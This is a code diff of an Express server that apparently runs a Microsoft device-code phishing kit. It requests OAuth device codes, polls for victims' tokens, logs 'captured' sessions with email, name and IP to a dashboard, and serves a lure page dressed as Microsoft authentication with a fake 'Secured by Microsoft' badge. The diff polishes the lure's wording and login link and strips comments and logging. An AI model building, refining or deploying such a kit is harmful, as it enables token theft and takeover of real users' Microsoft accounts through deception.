@@ -27,16 +27,24 @@ function getClientIp(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
-// ============================================
-// HEALTH CHECK
-// ============================================
-app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+// Test endpoint
+app.get('/api/test', async (req, res) => {
+    try {
+        const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            new URLSearchParams({
+                client_id: YOUR_CLIENT_ID,
+                scope: 'User.Read openid profile offline_access'
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        res.json({ success: true, message: 'Microsoft connection works!' });
+    } catch (err) {
+        res.json({ success: false, error: err.response?.data?.error_description || err.message });
+    }
 });
 
-// ============================================
-// CREATE DEVICE CODE SESSION
-// ============================================
+// Create session
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
@@ -66,7 +74,6 @@ app.post('/api/create-session', async (req, res) => {
         res.json({ success: true, sid: sid, user_code: user_code });
         
     } catch (err) {
-        console.error('Create session error:', err.message);
         res.status(500).json({ error: err.message });
     }
 });
@@ -125,29 +132,16 @@ async function pollForToken(device_code, sid) {
     }, 3000);
 }
 
-// ============================================
-// STATUS ENDPOINT
-// ============================================
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
-    
     const session = userSessions.get(sid);
-    if (session) {
-        return res.json({ status: 'captured', email: session.email });
-    }
-    
+    if (session) return res.json({ status: 'captured', email: session.email });
     for (const pending of pendingAuth.values()) {
-        if (pending.sid.toString() === sid) {
-            return res.json({ status: pending.status });
-        }
+        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
     }
-    
     res.json({ status: 'not_found' });
 });
 
-// ============================================
-// SESSIONS ENDPOINT
-// ============================================
 app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(userSessions.values()).map(s => ({
         sid: s.sid, email: s.email, name: s.name, ip: s.ip, capturedAt: s.capturedAt
@@ -166,9 +160,7 @@ app.delete('/api/sessions/clear', async (req, res) => {
     res.json({ success: true });
 });
 
-// ============================================
-// GENERATE AUTH PAGE - FIXED
-// ============================================
+// Generate Auth Page - WITH CORRECT MICROSOFT URL
 app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
@@ -193,13 +185,11 @@ app.get('/generate-auth-page', async (req, res) => {
         
         pollForToken(device_code, sid);
         
-        // Simple HTML that works
         const html = `<!DOCTYPE html>
 <html>
 <head>
     <title>Microsoft Authentication</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
@@ -215,6 +205,7 @@ app.get('/generate-auth-page', async (req, res) => {
         .steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:10px;font-size:12px}
         .steps ol{padding-left:20px;margin-top:5px}
         .steps li{margin:5px 0}
+        .note{font-size:11px;color:#999;margin-top:15px}
     </style>
 </head>
 <body>
@@ -227,16 +218,17 @@ app.get('/generate-auth-page', async (req, res) => {
     <div class="steps">
         <strong>📋 Steps:</strong>
         <ol>
-            <li>Click "Open Microsoft Login"</li>
-            <li>Enter code: <strong>${user_code}</strong></li>
+            <li>Click <strong>"Open Microsoft Login"</strong> above</li>
+            <li>Enter the code: <strong style="color:#0078d4">${user_code}</strong></li>
             <li>Sign in with your Microsoft account</li>
-            <li>Click "Continue" or "Accept"</li>
+            <li>Click <strong>"Continue"</strong> when asked</li>
             <li>This window will auto-close</li>
         </ol>
     </div>
     <div class="status" id="statusMsg">
         <span class="spinner"></span> Waiting for authentication...
     </div>
+    <div class="note">🔒 Secured by Microsoft</div>
 </div>
 <script>
     const SESSION_ID = ${sid};
@@ -248,8 +240,9 @@ app.get('/generate-auth-page', async (req, res) => {
         alert('✓ Code copied!');
     }
     
+    // FIXED: Using the correct Microsoft login URL
     document.getElementById('openBtn').onclick = function() {
-        window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth', '_blank', 'width=600,height=700');
+        window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700,resizable=yes');
     };
     
     async function checkStatus() {
@@ -274,36 +267,14 @@ app.get('/generate-auth-page', async (req, res) => {
         res.send(html);
         
     } catch (err) {
-        console.error('Generate page error:', err.message);
-        // Send a simple error page
-        res.status(500).send(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Error</title></head>
-            <body style="font-family:Arial;text-align:center;padding:50px">
-                <h2>❌ Error</h2>
-                <p>Failed to generate auth page: ${err.message}</p>
-                <p>Make sure you have set YOUR_CLIENT_ID correctly in server.js</p>
-            </body>
-            </html>
-        `);
+        res.status(500).send('Error: ' + err.message);
     }
 });
 
-// ============================================
-// DASHBOARD
-// ============================================
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ============================================
-// START SERVER
-// ============================================
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📍 Dashboard: https://greatness-dashboard.onrender.com`);
-    console.log(`📍 Auth Page: https://greatness-dashboard.onrender.com/generate-auth-page`);
-    console.log(`========================================\n`);
 });
